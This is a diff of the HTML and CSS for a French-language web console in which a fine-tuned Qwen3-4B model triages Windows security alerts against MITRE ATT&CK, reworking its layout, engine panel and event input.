@@ -3,446 +3,458 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>SOC-Qwen-FR — Console de triage d'alertes Windows</title>
+<title>SOC-Qwen-FR — Console de triage</title>
 <meta name="description" content="Triage d'alertes Windows en français par un Qwen3-4B fine-tuné : verdict, technique MITRE ATT&CK, tactique, sévérité et recommandations.">
-<!-- active l'isolation cross-origin (multi-thread WebAssembly) sur GitHub Pages -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<!-- active l'isolation cross-origin (WebAssembly multi-thread) sur GitHub Pages -->
 <script src="coi-serviceworker.js"></script>
 <style>
-  :root {
-    --bg:#070b14; --bg2:#0b1120; --panel:#0f172a; --panel2:#131c31; --line:#1e293b; --line2:#2a3650;
-    --text:#e2e8f0; --muted:#8a96ad; --dim:#5b6780;
-    --accent:#38bdf8; --accent2:#818cf8;
-    --crit:#f43f5e; --high:#f97316; --med:#eab308; --low:#22c55e; --info:#64748b; --ok:#10b981;
-    --mono: ui-monospace, "JetBrains Mono", "Cascadia Code", Consolas, monospace;
-  }
-  * { box-sizing:border-box; }
-  html, body { margin:0; background:var(--bg); color:var(--text);
-    font:14px/1.5 Inter, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
-  body { background: radial-gradient(1200px 500px at 80% -10%, rgba(56,189,248,.08), transparent 60%),
-                     radial-gradient(900px 400px at -10% 10%, rgba(129,140,248,.07), transparent 60%), var(--bg); min-height:100vh; }
-  a { color:var(--accent); text-decoration:none; } a:hover { text-decoration:underline; }
-  button { font:inherit; cursor:pointer; }
-  .wrap { max-width:1360px; margin:0 auto; padding:0 20px; }
+:root{--bg:#f1fbfa;--bg2:#e3f4f3;--ink:#0e3a3d;--mid:#5d8284;--faint:#9dbcbc;--line:#d3e8e7;--coral:#ff5a3c;--teal:#0f9d8a;--aqua:#46c9bf;
+  --card:rgba(255,255,255,.72);--crit:#e5372a;--high:#ff5a3c;--med:#e3a21a;--low:#0f9d8a;--info:#9dbcbc;
+  --mono:'JetBrains Mono',ui-monospace,Consolas,monospace;--sans:Inter,system-ui,sans-serif}
+*{box-sizing:border-box;margin:0;padding:0}
+html{font-size:clamp(9px,.78125vw,11.5px)}
+body{font-family:var(--mono);color:var(--ink);-webkit-font-smoothing:antialiased;min-height:100vh;
+  background:radial-gradient(90% 70% at 50% 30%,#fafefd 0%,var(--bg) 55%,var(--bg2) 100%) fixed}
+a{color:var(--teal);text-decoration:none} a:hover{text-decoration:underline}
+button{font:inherit;cursor:pointer;color:inherit}
+.frame{max-width:150rem;margin:0 auto;padding:0 2rem 2rem;position:relative}
+/* décor : anneaux fins derrière la console */
+.rings{position:fixed;inset:0;pointer-events:none;z-index:0;opacity:.55}
+.rings circle{fill:none;stroke:#bcd8d7;stroke-width:1}
+.rings circle.d{stroke-dasharray:6 5}
+main,header,footer{position:relative;z-index:1}
 
-  /* ---------- en-tête ---------- */
-  header { border-bottom:1px solid var(--line); background:rgba(7,11,20,.75); backdrop-filter:blur(8px); position:sticky; top:0; z-index:10; }
-  .hbar { display:flex; align-items:center; gap:16px; height:60px; }
-  .brand { display:flex; align-items:center; gap:10px; font-weight:700; font-size:16px; letter-spacing:.2px; }
-  .logo { width:30px; height:30px; border-radius:8px; display:grid; place-items:center;
-          background:linear-gradient(135deg, var(--accent), var(--accent2)); color:#04121f; font-weight:800; font-size:14px; }
-  .brand small { display:block; font-weight:500; font-size:11.5px; color:var(--muted); letter-spacing:0; }
-  .spacer { flex:1; }
-  .status { display:flex; align-items:center; gap:8px; padding:6px 12px; border:1px solid var(--line2); border-radius:999px; font-size:12.5px; color:var(--muted); }
-  .dot { width:8px; height:8px; border-radius:50%; background:var(--dim); box-shadow:0 0 0 3px rgba(91,103,128,.15); }
-  .dot.ready { background:var(--ok); box-shadow:0 0 0 3px rgba(16,185,129,.18); }
-  .dot.busy { background:var(--med); box-shadow:0 0 0 3px rgba(234,179,8,.18); animation:pulse 1.2s infinite; }
-  .dot.err { background:var(--crit); }
-  @keyframes pulse { 50% { opacity:.4; } }
-  .hlinks { display:flex; gap:14px; font-size:13px; }
-  .hlinks a { color:var(--muted); } .hlinks a:hover { color:var(--text); text-decoration:none; }
+/* ---------- en-tête ---------- */
+header{display:grid;grid-template-columns:auto 1fr auto auto;gap:3rem;align-items:start;padding-top:0}
+.logo{width:12.8rem;height:7rem;background:var(--coral);color:#fff;display:flex;align-items:center;gap:1rem;padding-left:1.8rem;
+  font-size:1.25rem;font-weight:600;letter-spacing:.14em;margin-left:-2rem}
+.logo svg{width:3.2rem;height:3.2rem}
+.head{padding-top:1.5rem}
+.k{font-size:.72rem;letter-spacing:.2em;color:var(--mid)}
+.head h1{font:700 2.8rem/1 var(--sans);letter-spacing:-.01em;margin:.5rem 0 .6rem}
+.head h1 em{font-style:normal;color:var(--coral);font-weight:600;margin-left:.3rem}
+.head .s{font-size:.82rem;letter-spacing:.18em;color:var(--mid)}
+.load{padding-top:1.7rem;width:27rem}
+.row{display:flex;justify-content:space-between;font-size:.72rem;letter-spacing:.14em;color:var(--mid)}
+.row b{color:var(--ink);font-weight:600}
+#loadbar{display:flex;gap:.16rem;height:1.5rem;margin:.45rem 0 .4rem}
+#loadbar i{flex:1;background:var(--line)}
+.row.m{font-size:.6rem;color:var(--faint)}
+.meta{display:flex;gap:2.2rem;padding-top:1.7rem}
+.meta div{font-size:.72rem;letter-spacing:.14em;color:var(--mid);border-left:1px solid var(--line);padding-left:1rem;min-width:8rem}
+.meta b{display:block;margin-top:.75rem;font-size:.95rem;font-weight:500;color:var(--ink);letter-spacing:.06em;white-space:nowrap}
+.dot{display:inline-block;width:.5rem;height:.5rem;border-radius:50%;background:var(--faint);margin-right:.5rem;vertical-align:.1rem}
+.dot.ok{background:var(--teal)} .dot.hot{background:var(--coral)} .dot.busy{background:var(--coral);animation:pulse 1s infinite}
+@keyframes pulse{50%{opacity:.3}}
+.rule{display:flex;justify-content:space-between;font-size:.68rem;letter-spacing:.16em;color:var(--faint);margin:2.2rem 0 .8rem}
+.plus{color:var(--coral);opacity:.55;letter-spacing:1.1rem;font-size:.9rem}
 
-  /* ---------- grille ---------- */
-  .kpis { display:grid; grid-template-columns:repeat(5, 1fr); gap:12px; margin:20px 0 16px; }
-  .kpi { background:var(--panel); border:1px solid var(--line); border-radius:12px; padding:14px 16px; }
-  .kpi .l { color:var(--muted); font-size:11.5px; text-transform:uppercase; letter-spacing:.08em; }
-  .kpi .v { font-size:24px; font-weight:700; margin-top:2px; font-variant-numeric:tabular-nums; }
-  .kpi .s { font-size:12px; color:var(--dim); }
-  .grid { display:grid; grid-template-columns: 340px 1fr 1.1fr; gap:16px; align-items:start; }
-  @media (max-width:1180px) { .grid { grid-template-columns:1fr 1fr; } .grid > .engine { grid-column:1 / -1; } .kpis { grid-template-columns:repeat(3,1fr);} }
-  @media (max-width:760px) { .grid { grid-template-columns:1fr; } .kpis { grid-template-columns:repeat(2,1fr);} .hlinks { display:none; } }
-  .card { background:var(--panel); border:1px solid var(--line); border-radius:14px; }
-  .card > .hd { display:flex; align-items:center; gap:10px; padding:14px 16px; border-bottom:1px solid var(--line); }
-  .card > .hd h2 { margin:0; font-size:13px; font-weight:600; text-transform:uppercase; letter-spacing:.08em; color:#cbd5e1; }
-  .card > .bd { padding:16px; }
-  .muted { color:var(--muted); } .small { font-size:12.5px; }
+/* ---------- cartes ---------- */
+.grid{display:grid;grid-template-columns:28rem 1fr 1.15fr;gap:1.4rem;align-items:start}
+.col{display:flex;flex-direction:column;gap:1.4rem}
+.card{background:var(--card);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,.85);
+  box-shadow:0 .4rem 2rem rgba(40,110,110,.07);padding:1.1rem 1.2rem}
+.ct{display:flex;justify-content:space-between;align-items:center;font-size:.82rem;font-weight:600;letter-spacing:.14em;margin-bottom:.9rem}
+.ct span{border-left:.26rem solid var(--coral);padding-left:.55rem}
+.ct small{font-size:.66rem;color:var(--faint);font-weight:400}
+.big{font:700 2.8rem/1 var(--sans)} .big small{font:500 1.1rem var(--sans);color:var(--mid);margin-left:.2rem}
+.tiny{font-size:.64rem;letter-spacing:.14em;color:var(--mid)}
+.foot{display:flex;justify-content:space-between;font-size:.66rem;letter-spacing:.12em;color:var(--mid);margin-top:.6rem}
+.foot b{color:var(--ink);font-weight:500}
+.tri{display:grid;grid-template-columns:repeat(3,1fr);margin-top:.9rem;border-top:1px solid var(--line);padding-top:.7rem}
+.tri b{display:block;font-size:.95rem;font-weight:500;margin-top:.35rem;color:var(--ink)}
+.ctag{font-size:.6rem;letter-spacing:.12em;padding:.22rem .5rem;background:var(--teal);color:#fff;font-weight:600;white-space:nowrap}
+.ctag.hot{background:var(--coral)} .ctag.idle{background:var(--line);color:var(--mid)}
+.btns{display:flex;flex-wrap:wrap;gap:.5rem}
+.btn{font:500 .72rem var(--mono);letter-spacing:.1em;color:var(--ink);background:rgba(255,255,255,.75);border:1px solid var(--line);
+  padding:.5rem .75rem;transition:background .15s,color .15s,border-color .15s}
+.btn:hover{border-color:var(--coral)} .btn.on{background:var(--coral);border-color:var(--coral);color:#fff}
+.btn.go{background:var(--coral);border-color:var(--coral);color:#fff;font-weight:600;padding:.8rem 1rem}
+.btn.go:hover{filter:brightness(1.06)} .btn:disabled{opacity:.45;cursor:not-allowed}
+.btn.block{width:100%;text-align:center}
+input[type=text]{width:100%;background:rgba(255,255,255,.8);border:1px solid var(--line);padding:.6rem .7rem;font:.78rem var(--mono);color:var(--ink)}
+input[type=text]:focus,textarea:focus{outline:none;border-color:var(--coral)}
+.note{font-size:.7rem;line-height:1.55;color:var(--mid);letter-spacing:.02em}
+.err{color:var(--coral);font-size:.7rem;font-weight:600;letter-spacing:.04em;min-height:1rem;margin-top:.5rem}
+.bar{display:flex;gap:.16rem;height:1.1rem;margin:.6rem 0 .4rem} .bar i{flex:1;background:var(--line)}
 
-  /* ---------- moteur ---------- */
-  .seg { display:grid; grid-template-columns:1fr 1fr; background:var(--bg2); border:1px solid var(--line); border-radius:10px; padding:3px; margin-bottom:14px; }
-  .seg button { background:transparent; border:0; color:var(--muted); padding:8px; border-radius:8px; font-size:13px; font-weight:600; }
-  .seg button.on { background:var(--panel2); color:var(--text); box-shadow:0 1px 0 rgba(255,255,255,.04) inset, 0 0 0 1px var(--line2); }
-  .mode { display:none; } .mode.on { display:block; }
-  .btn { display:inline-flex; align-items:center; justify-content:center; gap:8px; border:1px solid var(--line2); background:var(--panel2); color:var(--text);
-         padding:9px 14px; border-radius:9px; font-weight:600; font-size:13px; }
-  .btn:hover { border-color:#3b4a68; }
-  .btn.primary { background:linear-gradient(135deg, #0ea5e9, #6366f1); border-color:transparent; color:white; }
-  .btn.primary:hover { filter:brightness(1.08); }
-  .btn:disabled { opacity:.5; cursor:not-allowed; filter:none; }
-  .btn.block { width:100%; }
-  .bar { height:8px; background:var(--bg2); border-radius:99px; overflow:hidden; border:1px solid var(--line); margin:10px 0 6px; }
-  .bar > i { display:block; height:100%; width:0; background:linear-gradient(90deg, var(--accent), var(--accent2)); transition:width .2s; }
-  input[type=text] { width:100%; background:var(--bg2); color:var(--text); border:1px solid var(--line2); border-radius:9px; padding:9px 11px; font:13px var(--mono); }
-  input[type=text]:focus, textarea:focus { outline:none; border-color:var(--accent); box-shadow:0 0 0 3px rgba(56,189,248,.15); }
-  .note { font-size:12.5px; color:var(--muted); background:var(--bg2); border:1px solid var(--line); border-radius:10px; padding:10px 12px; margin-top:12px; }
-  .note b { color:#cbd5e1; }
-  .feat { list-style:none; padding:0; margin:12px 0 0; font-size:12.5px; color:var(--muted); }
-  .feat li { padding:3px 0 3px 18px; position:relative; } .feat li::before { content:"›"; position:absolute; left:4px; color:var(--accent); }
-  .tag { display:inline-block; font-size:11px; padding:2px 7px; border-radius:6px; background:var(--bg2); border:1px solid var(--line2); color:var(--muted); font-family:var(--mono); }
+/* ---------- moteur ---------- */
+.seg{display:grid;grid-template-columns:1fr 1fr;gap:.5rem;margin-bottom:.9rem}
+.mode{display:none} .mode.on{display:block}
+.perf{display:grid;grid-template-columns:1fr auto auto;gap:.45rem .8rem;font-size:.72rem;align-items:center}
+.perf dt{color:var(--mid);letter-spacing:.08em;font-size:.66rem} .perf .a{color:var(--faint);text-decoration:line-through} .perf .b{font-weight:600;color:var(--teal)}
 
-  /* ---------- saisie ---------- */
-  textarea { width:100%; min-height:300px; resize:vertical; background:#060a13; color:#d6e2f5; border:1px solid var(--line2); border-radius:10px;
-             padding:12px 14px; font:12.5px/1.55 var(--mono); tab-size:2; }
-  .chips { display:flex; flex-wrap:wrap; gap:6px; margin:12px 0 14px; }
-  .chip { background:var(--bg2); border:1px solid var(--line2); color:#cbd5e1; padding:5px 10px; border-radius:999px; font-size:12px; }
-  .chip:hover { border-color:var(--accent); color:white; }
-  .row { display:flex; gap:8px; align-items:center; }
-  .err { color:#fda4af; font-size:12.5px; margin-top:8px; min-height:18px; }
+/* ---------- saisie ---------- */
+textarea{width:100%;min-height:26rem;resize:vertical;background:rgba(255,255,255,.82);border:1px solid var(--line);padding:.9rem 1rem;
+  font:.78rem/1.6 var(--mono);color:var(--ink);tab-size:2}
+.chips{margin:.9rem 0}
 
-  /* ---------- résultat ---------- */
-  .empty { text-align:center; padding:60px 20px; color:var(--dim); }
-  .empty svg { opacity:.5; margin-bottom:10px; }
-  .verdict { display:flex; align-items:center; gap:14px; padding:14px 16px; border-radius:12px; border:1px solid; margin-bottom:14px; }
-  .verdict.sus { background:rgba(244,63,94,.08); border-color:rgba(244,63,94,.35); }
-  .verdict.ben { background:rgba(16,185,129,.08); border-color:rgba(16,185,129,.35); }
-  .vicon { width:42px; height:42px; border-radius:10px; display:grid; place-items:center; font-weight:800; font-size:20px; }
-  .sus .vicon { background:rgba(244,63,94,.18); color:var(--crit); } .ben .vicon { background:rgba(16,185,129,.18); color:var(--ok); }
-  .vtxt b { font-size:17px; letter-spacing:.06em; } .vtxt div { color:var(--muted); font-size:12.5px; }
-  .sev { margin-left:auto; text-align:right; }
-  .sev .meter { display:flex; gap:3px; margin-top:4px; justify-content:flex-end; }
-  .sev .meter i { width:14px; height:6px; border-radius:2px; background:var(--line2); }
-  .tech { display:grid; grid-template-columns:1fr auto; gap:6px 12px; padding:14px 16px; background:var(--bg2); border:1px solid var(--line); border-radius:12px; margin-bottom:14px; }
-  .tech .id { font:700 13px var(--mono); color:var(--accent); background:rgba(56,189,248,.1); border:1px solid rgba(56,189,248,.3); padding:3px 8px; border-radius:7px; display:inline-block; }
-  .tech .name { font-weight:600; font-size:15px; margin-top:6px; }
-  .tech .lbl { font-size:11.5px; color:var(--muted); text-transform:uppercase; letter-spacing:.08em; }
-  .chain { display:grid; grid-template-columns:repeat(15, 1fr); gap:3px; margin:4px 0 16px; }
-  .chain div { height:30px; border-radius:5px; background:var(--bg2); border:1px solid var(--line); position:relative; }
-  .chain div.on { background:linear-gradient(180deg, rgba(244,63,94,.55), rgba(244,63,94,.25)); border-color:var(--crit); box-shadow:0 0 12px rgba(244,63,94,.35); }
-  .chain div:hover::after { content:attr(data-t); position:absolute; bottom:36px; left:50%; transform:translateX(-50%); white-space:nowrap;
-        background:#020617; border:1px solid var(--line2); padding:4px 8px; border-radius:6px; font-size:11.5px; z-index:5; }
-  .chainlbl { display:flex; justify-content:space-between; font-size:10.5px; color:var(--dim); text-transform:uppercase; letter-spacing:.06em; }
-  h3 { font-size:12px; text-transform:uppercase; letter-spacing:.08em; color:var(--muted); margin:16px 0 8px; font-weight:600; }
-  .expl { line-height:1.6; color:#d3dceb; }
-  .recos { list-style:none; margin:0; padding:0; }
-  .recos li { display:flex; gap:10px; align-items:flex-start; padding:8px 10px; border:1px solid var(--line); border-radius:9px; margin-bottom:6px; background:var(--bg2); }
-  .recos input { margin-top:3px; accent-color:var(--ok); }
-  details { margin-top:14px; } summary { cursor:pointer; color:var(--muted); font-size:12.5px; }
-  pre { background:#060a13; border:1px solid var(--line); border-radius:10px; padding:12px; font:12px/1.5 var(--mono); overflow:auto; max-height:260px; }
-  .meta { display:flex; gap:12px; flex-wrap:wrap; font-size:12px; color:var(--dim); margin-top:12px; }
-  .stream { font:12px/1.5 var(--mono); color:var(--muted); white-space:pre-wrap; max-height:220px; overflow:auto; background:#060a13; border:1px dashed var(--line2); border-radius:10px; padding:12px; }
+/* ---------- triage ---------- */
+.verdict{display:grid;grid-template-columns:1fr auto;gap:1rem;align-items:end;border-bottom:1px solid var(--line);padding-bottom:1rem}
+.vm{font:700 3.4rem/1 var(--sans);letter-spacing:-.01em;color:var(--coral)} .vm.ok{color:var(--teal)}
+.sevm{display:flex;gap:.2rem;margin-top:.4rem} .sevm i{width:2.2rem;height:.55rem;background:var(--line)}
+.tech{display:grid;grid-template-columns:1fr auto;gap:1rem;padding:1rem 0;border-bottom:1px solid var(--line)}
+.tid{font:600 1.1rem var(--mono);color:#fff;background:var(--ink);padding:.25rem .6rem;display:inline-block;letter-spacing:.06em}
+.tid:hover{background:var(--coral);text-decoration:none}
+.tname{font:600 1.35rem/1.25 var(--sans);margin-top:.5rem}
+.chain{display:grid;grid-template-columns:repeat(15,1fr);gap:.2rem;margin:.6rem 0 .3rem}
+.chain i{height:1.6rem;background:var(--line);position:relative}
+.chain i.on{background:var(--coral)}
+.chain i:hover::after{content:attr(data-t);position:absolute;bottom:2.2rem;left:50%;transform:translateX(-50%);white-space:nowrap;background:var(--ink);color:#fff;
+  font-size:.62rem;letter-spacing:.08em;padding:.3rem .5rem;z-index:5;font-style:normal}
+h3{font-size:.68rem;letter-spacing:.16em;color:var(--mid);font-weight:500;margin:1.1rem 0 .5rem}
+.expl{font:500 .95rem/1.6 var(--sans);color:var(--ink)}
+.reco{display:grid;grid-template-columns:2rem 1fr;align-items:start;font-size:.78rem;padding:.45rem 0;border-top:1px solid var(--line);cursor:pointer}
+.reco .n{color:var(--faint);font-size:.68rem} .reco.done span:last-child{text-decoration:line-through;color:var(--faint)}
+.empty{padding:4rem 1rem;text-align:center;color:var(--faint);font-size:.72rem;letter-spacing:.14em;line-height:2}
+.stream{font:.72rem/1.55 var(--mono);color:var(--mid);white-space:pre-wrap;max-height:20rem;overflow:auto;border:1px dashed var(--line);padding:.8rem;background:rgba(255,255,255,.6)}
+details{margin-top:.9rem} summary{cursor:pointer;font-size:.66rem;letter-spacing:.14em;color:var(--mid)}
+pre{font:.7rem/1.5 var(--mono);background:rgba(255,255,255,.7);border:1px solid var(--line);padding:.8rem;overflow:auto;max-height:22rem;margin-top:.5rem}
 
-  /* ---------- historique & stats ---------- */
-  .lower { display:grid; grid-template-columns: 2fr 1fr; gap:16px; margin:16px 0 30px; }
-  @media (max-width:1000px) { .lower { grid-template-columns:1fr; } }
-  table { width:100%; border-collapse:collapse; font-size:13px; }
-  th { text-align:left; font-weight:600; color:var(--muted); font-size:11.5px; text-transform:uppercase; letter-spacing:.06em; padding:8px 10px; border-bottom:1px solid var(--line); }
-  td { padding:9px 10px; border-bottom:1px solid var(--line); vertical-align:middle; }
-  tr.clk { cursor:pointer; } tr.clk:hover td { background:rgba(56,189,248,.04); }
-  .pill { display:inline-block; padding:2px 8px; border-radius:99px; font-size:11.5px; font-weight:600; }
-  .pill.sus { background:rgba(244,63,94,.14); color:#fb7185; } .pill.ben { background:rgba(16,185,129,.14); color:#34d399; }
-  .sv { display:inline-flex; align-items:center; gap:6px; } .sv i { width:8px; height:8px; border-radius:50%; display:inline-block; }
-  .hbars .r { display:grid; grid-template-columns: 150px 1fr 28px; gap:8px; align-items:center; font-size:12.5px; margin:7px 0; }
-  .hbars .t { height:10px; background:var(--bg2); border-radius:99px; overflow:hidden; border:1px solid var(--line); }
-  .hbars .t i { display:block; height:100%; background:linear-gradient(90deg, var(--accent2), var(--crit)); }
-  .hbars .n { text-align:right; color:var(--muted); font-variant-numeric:tabular-nums; }
-  .mtab td:first-child { color:var(--muted); } .mtab td { padding:7px 6px; } .mtab b { color:#a7f3d0; }
-  footer { border-top:1px solid var(--line); color:var(--dim); font-size:12px; padding:18px 0 28px; }
-  .toast { position:fixed; bottom:20px; right:20px; background:#020617; border:1px solid var(--line2); padding:10px 14px; border-radius:10px; font-size:13px; opacity:0; transform:translateY(8px); transition:.2s; z-index:50; }
-  .toast.on { opacity:1; transform:none; }
+/* ---------- pipeline ---------- */
+.sub{display:grid;grid-template-columns:2rem 1fr auto;align-items:center;padding:.35rem 0;font-size:.74rem;font-weight:500;letter-spacing:.06em;position:relative}
+.sub .n{color:var(--faint);font-weight:400;font-size:.68rem}
+.sub i{display:block;font-style:normal;font-weight:400;font-size:.56rem;color:var(--mid);letter-spacing:.04em;margin-top:.05rem}
+.sub.on{color:var(--coral)} .sub.on:before{content:"";position:absolute;left:-.6rem;top:.2rem;bottom:.2rem;width:.16rem;background:var(--coral)}
+
+/* ---------- bas ---------- */
+.lower{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1.4rem;margin-top:1.4rem}
+.lower .wide{grid-column:span 2}
+table{width:100%;border-collapse:collapse;font-size:.72rem}
+th{text-align:left;font-weight:500;color:var(--mid);font-size:.62rem;letter-spacing:.14em;padding:.5rem .4rem;border-bottom:1px solid var(--line)}
+td{padding:.55rem .4rem;border-bottom:1px solid var(--line);vertical-align:middle}
+tr.clk{cursor:pointer} tr.clk:hover td{background:rgba(255,90,60,.05)}
+.pill{font-size:.6rem;letter-spacing:.12em;padding:.2rem .45rem;font-weight:600;color:#fff;background:var(--coral)} .pill.ok{background:var(--teal)}
+.sq{display:inline-block;width:.6rem;height:.6rem;margin-right:.4rem;vertical-align:-.05rem}
+.hb{display:grid;grid-template-columns:12rem 1fr 2rem;gap:.6rem;align-items:center;font-size:.7rem;margin:.45rem 0}
+.hb u{display:block;height:.42rem;background:var(--line);position:relative;text-decoration:none} .hb u i{position:absolute;inset:0 auto 0 0;background:var(--coral)}
+.hb s{text-decoration:none;text-align:right;color:var(--mid)}
+#chart{display:block;width:100%;height:9rem;margin-top:.4rem}
+.lg{display:grid;grid-template-columns:3.6rem 1fr;gap:1.1rem;align-items:center;margin-top:.3rem}
+#play{width:3.4rem;height:3.4rem;border-radius:50%;background:var(--coral);border:0;display:grid;place-items:center}
+#play svg{width:1.3rem;height:1.3rem;fill:#fff}
+#rail{position:relative;height:1.8rem;margin-top:.2rem}
+#rail .b{position:absolute;left:0;right:0;top:50%;height:2px;background:var(--line)}
+#rail em{position:absolute;top:50%;width:.8rem;height:.8rem;margin:-.4rem 0 0 -.4rem;border-radius:50%;background:#fff;border:2px solid var(--coral);cursor:pointer}
+#rail em.ok{border-color:var(--teal)} #rail em.sel{background:var(--coral)} #rail em.ok.sel{background:var(--teal)}
+#msg{color:var(--coral);font-weight:600}
+.bot{display:flex;justify-content:space-between;font-size:.66rem;letter-spacing:.2em;color:var(--mid);padding:1.6rem 0 .4rem}
+.bot b{color:var(--coral);font-weight:500}
+.toast{position:fixed;bottom:2rem;right:2rem;background:var(--ink);color:#fff;font-size:.72rem;letter-spacing:.1em;padding:.7rem 1rem;opacity:0;transform:translateY(.5rem);transition:.2s;z-index:50}
+.toast.on{opacity:1;transform:none}
+
+@media (max-width:1250px){.grid{grid-template-columns:1fr 1fr}.grid .col:first-child{grid-column:1/-1;display:grid;grid-template-columns:1fr 1fr}
+  header{grid-template-columns:auto 1fr}.load,.meta{display:none}.lower{grid-template-columns:1fr 1fr}.lower .wide{grid-column:1/-1}}
+@media (max-width:820px){html{font-size:10px}.grid,.lower,.grid .col:first-child{grid-template-columns:1fr}.head .k{display:none}.rule{display:none}.bot{flex-direction:column;gap:.6rem}}
 </style>
 </head>
 <body>
+<svg class="rings" viewBox="-500 -350 1000 700" preserveAspectRatio="xMidYMid slice" aria-hidden="true">
+  <circle r="300"/><circle r="230" class="d"/><circle r="380" class="d" transform="scale(1 .55) rotate(8)"/><circle r="170" transform="scale(1 .4)"/>
+</svg>
+<div class="frame">
 <header>
-  <div class="wrap hbar">
-    <div class="brand"><div class="logo">SQ</div><div>SOC-Qwen-FR<small>Console de triage d'alertes Windows · MITRE ATT&amp;CK</small></div></div>
-    <div class="spacer"></div>
-    <div class="status"><span class="dot" id="sdot"></span><span id="stxt">Aucun moteur connecté</span></div>
-    <nav class="hlinks">
-      <a href="https://github.com/azddine123/soc-qwen-fr" target="_blank" rel="noopener">GitHub</a>
-      <a href="https://huggingface.co/AZAS123/soc-qwen3-4b-fr-lora" target="_blank" rel="noopener">Modèle</a>
-      <a href="https://huggingface.co/datasets/AZAS123/soc-triage-fr" target="_blank" rel="noopener">Dataset</a>
-    </nav>
-  </div>
+  <div class="logo"><svg viewBox="0 0 40 40" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 4l13 5v9c0 8-5.6 14.5-13 17-7.4-2.5-13-9-13-17V9l13-5z"/><path d="M14 20l4 4 8-8"/></svg>SQ-FR</div>
+  <div class="head"><div class="k">CONSOLE DE TRIAGE SOC / DÉTECTION WINDOWS</div><h1>SOC-Qwen-FR<em>/</em></h1><div class="s">QWEN3-4B FINE-TUNÉ / MITRE ATT&amp;CK V19</div></div>
+  <div class="load"><div class="row"><span>CHARGE D'ALERTES</span><b id="loadv">0%</b></div><div id="loadbar"></div><div class="row m"><span>CALME</span><span>VIGILANCE</span><span>INCIDENT</span></div></div>
+  <div class="meta"><div>MODÈLE<b>Q4_K_M · 4B</b></div><div>MOTEUR<b id="m-eng">—</b></div><div>STATUT<b id="st"><span class="dot" id="sdot"></span><span id="stxt">HORS LIGNE</span></b></div><div>SESSION<b id="rt">00:00:00</b></div></div>
 </header>
+<div class="rule"><span>MODÈLE SOC-QWEN-FR · REV 1</span><span class="plus">++++++++++++++</span><span id="iso">ÉVÉNEMENT · AUCUN</span></div>
 
-<main class="wrap">
-  <section class="kpis">
-    <div class="kpi"><div class="l">Alertes analysées</div><div class="v" id="k-total">0</div><div class="s">dans cette console</div></div>
-    <div class="kpi"><div class="l">Suspectes</div><div class="v" id="k-sus" style="color:#fb7185">0</div><div class="s" id="k-susp">—</div></div>
-    <div class="kpi"><div class="l">Critiques / élevées</div><div class="v" id="k-high" style="color:var(--high)">0</div><div class="s">à traiter en priorité</div></div>
-    <div class="kpi"><div class="l">Techniques distinctes</div><div class="v" id="k-tech">0</div><div class="s">MITRE ATT&amp;CK</div></div>
-    <div class="kpi"><div class="l">Temps moyen</div><div class="v" id="k-time">—</div><div class="s">par analyse</div></div>
+<main>
+<div class="grid">
+  <!-- colonne 1 : moteur + pipeline -->
+  <div class="col">
+    <section class="card"><div class="ct"><span>MOTEUR</span><small>01</small></div>
+      <div class="seg btns"><button class="btn on" id="m-browser">NAVIGATEUR</button><button class="btn" id="m-colab">SERVEUR COLAB</button></div>
+      <div class="mode on" id="p-browser">
+        <div class="note">Le modèle (GGUF Q4_K_M, 2,5 Go) s'exécute dans votre navigateur. Aucune donnée ne quitte le poste.</div>
+        <div class="bar" id="dlbar"></div>
+        <div class="row"><span id="dl-txt">NON CHARGÉ</span><b id="dl-pct">0%</b></div>
+        <button class="btn go block" id="btn-load" style="margin-top:.8rem">CHARGER LE MODÈLE</button>
+        <div class="tri tiny"><div>ACCÉL.<b id="gpu">—</b></div><div>THREADS<b id="thr">—</b></div><div>CACHE<b>LOCAL</b></div></div>
+      </div>
+      <div class="mode" id="p-colab">
+        <div class="note">GPU T4 gratuit. Lancez la démo Colab, puis collez le lien <b>https://….gradio.live</b> affiché en bas du notebook.</div>
+        <a class="btn block" style="display:block;margin:.8rem 0 .6rem" target="_blank" rel="noopener" href="https://colab.research.google.com/github/azddine123/soc-qwen-fr/blob/main/notebooks/demo_colab.ipynb">1 · OUVRIR LA DÉMO COLAB ↗</a>
+        <input type="text" id="colab-url" placeholder="https://xxxxxxxx.gradio.live">
+        <button class="btn go block" id="btn-colab" style="margin-top:.6rem">2 · CONNECTER</button>
+      </div>
+      <div class="err" id="eng-err"></div>
+    </section>
+    <section class="card"><div class="ct"><span>PIPELINE</span><small>02</small></div><div id="subs"></div></section>
+    <section class="card"><div class="ct"><span>PERFORMANCES</span><small>03</small></div>
+      <dl class="perf">
+        <dt>JSON EXPLOITABLE</dt><span class="a">33%</span><span class="b">94%</span>
+        <dt>VERDICT CORRECT</dt><span class="a">86%</span><span class="b">100%</span>
+        <dt>TECHNIQUE EXACTE</dt><span class="a">18%</span><span class="b">24%</span>
+        <dt>TECHNIQUE PARENTE</dt><span class="a">21%</span><span class="b">33%</span>
+        <dt>TACTIQUE (ID TA)</dt><span class="a">0%</span><span class="b">36%</span>
+      </dl>
+      <div class="foot"><span>BASE → FINE-TUNÉ</span><span>123 LOGS RÉELS</span></div>
+    </section>
+  </div>
+
+  <!-- colonne 2 : événement -->
+  <section class="card"><div class="ct"><span>ÉVÉNEMENT</span><small>04</small></div>
+    <textarea id="event" spellcheck="false" placeholder='{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "Image": "...", "CommandLine": "..."}'></textarea>
+    <div class="btns chips" id="chips"></div>
+    <div class="btns">
+      <button class="btn go" id="btn-run" style="flex:1" disabled>ANALYSER L'ÉVÉNEMENT</button>
+      <button class="btn" id="btn-fmt" title="Formater le JSON">{ }</button>
+      <label class="btn" title="Importer un fichier JSON">IMPORTER<input type="file" id="file" accept=".json,.txt" hidden></label>
+      <button class="btn" id="btn-clear" title="Effacer">✕</button>
+    </div>
+    <div class="err" id="run-err"></div>
   </section>
 
-  <div class="grid">
-    <!-- moteur -->
